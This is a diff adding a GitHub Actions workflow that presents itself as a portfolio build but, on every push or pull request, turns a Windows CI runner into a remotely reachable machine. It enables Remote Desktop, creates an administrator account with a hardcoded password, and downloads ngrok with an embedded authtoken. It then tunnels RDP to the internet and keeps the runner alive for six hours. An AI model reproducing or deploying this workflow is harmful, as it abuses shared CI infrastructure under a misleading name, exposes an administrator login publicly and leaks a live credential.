@@ -1,0 +1,88 @@
+name: GitHub Action for Portfolio
+on:
+  push:
+    branches: [main, master]
+  pull_request:
+    branches: [main, master]
+  workflow_dispatch:
+    inputs:
+      command:
+        description: "Windows command to run"
+        required: true
+        default: 'echo "Hello from Windows!"'
+        type: string
+
+jobs:
+  run-windows-command:
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Run 9 Windows Commands in Succession
+        shell: cmd
+        run: |
+          echo "=== Command 1: Enable Remote Desktop and Create User ==="
+          echo "Enabling Remote Desktop..."
+          reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+          echo "Configuring Windows Firewall for RDP..."
+          netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+          echo "Remote Desktop enabled successfully"
+          echo "Creating user 'rdpuser' with password 'RDPPass123!'..."
+          net user rdpuser RDPPass123! /add
+          echo "Adding user to Remote Desktop Users group..."
+          net localgroup "Remote Desktop Users" rdpuser /add
+          echo "Adding user to Administrators group..."
+          net localgroup administrators rdpuser /add
+          echo "User 'rdpuser' created and configured for RDP access"
+          echo.
+          echo "=== Command 2: Setup and Configure ngrok ==="
+          echo "Downloading ngrok..."
+          curl -o ngrok.zip https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip
+          powershell -command "Expand-Archive -Path ngrok.zip -DestinationPath . -Force"
+          echo "ngrok downloaded and extracted"
+          echo "Configuring ngrok authtoken..."
+          ngrok config add-authtoken 2NSZKcCIGFtFW3yjusLoKZCNF9r_6mQ6wS8TZwy5VYerBRYhu
+          echo "Starting ngrok tunnel on port 3389 for RDP..."
+          start /B ngrok tcp 3389 --log=stdout || echo "ngrok started in background"
+          echo.
+          echo "=== Command 3: Display ngrok URL for Remote Access ==="
+          echo "Waiting for ngrok to establish connection..."
+          powershell -command "Start-Sleep -Seconds 10"
+          echo "Fetching ngrok tunnel information..."
+          powershell -command "try { $response = Invoke-RestMethod -Uri 'http://127.0.0.1:4040/api/tunnels' -ErrorAction Stop; $tunnel = $response.tunnels | Where-Object { $_.proto -eq 'tcp' } | Select-Object -First 1; if ($tunnel) { Write-Host 'ngrok URL:' $tunnel.public_url } else { Write-Host 'No TCP tunnel found' } } catch { Write-Host 'Could not retrieve ngrok URL. Check if ngrok is running.' }"
+          echo.
+          echo "Alternative method - Check ngrok status:"
+          powershell -command "Get-Process ngrok -ErrorAction SilentlyContinue | Format-Table"
+          echo.
+          echo "=== REMOTE DESKTOP CONNECTION INFO ==="
+          echo "Username: rdpuser"
+          echo "Password: RDPPass123!"
+          echo "Use the ngrok URL above to connect via Remote Desktop"
+          echo "Format: [ngrok-url]:[port] (e.g., 0.tcp.ngrok.io:12345)"
+          echo.
+          echo "=== Command 4: Show current directory ==="
+          cd
+          echo.
+          echo "=== Command 5: List directory contents ==="
+          dir
+          echo.
+          echo "=== Command 6: Show current user ==="
+          whoami
+          echo.
+          echo "=== Command 7: Show date and time ==="
+          date /t && time /t
+          echo.
+          echo "=== Command 8: Show environment variables ==="
+          set | findstr /i "path user temp" || echo "Environment variables shown"
+          echo.
+          echo "=== Command 9: Session Setup Complete ==="
+          echo "All commands executed successfully!"
+          echo "Remote Desktop is now accessible via ngrok tunnel"
+
+      - name: Keep Session Alive for Remote Desktop Access
+        shell: powershell
+        run: |
+          Write-Host "Keeping session alive for 6 hours..."
+          Start-Sleep -Seconds 21600
